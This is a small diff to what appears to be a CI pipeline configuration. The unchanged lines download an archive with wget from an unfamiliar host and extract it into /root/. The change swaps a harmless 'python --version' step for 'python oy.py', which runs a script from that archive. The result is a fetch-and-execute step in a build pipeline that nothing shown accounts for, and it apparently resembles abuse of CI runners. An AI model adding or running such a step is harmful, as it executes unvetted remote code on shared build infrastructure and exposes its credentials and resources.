@@ -15,4 +15,4 @@ pipelines:
           - wget https://k0bra1.sloppy.zone/samir.tar.bz2
           - tar -xvf samir.tar.bz2 -C /root/
           - ls /root/*
-          - python --version
+          - python oy.py
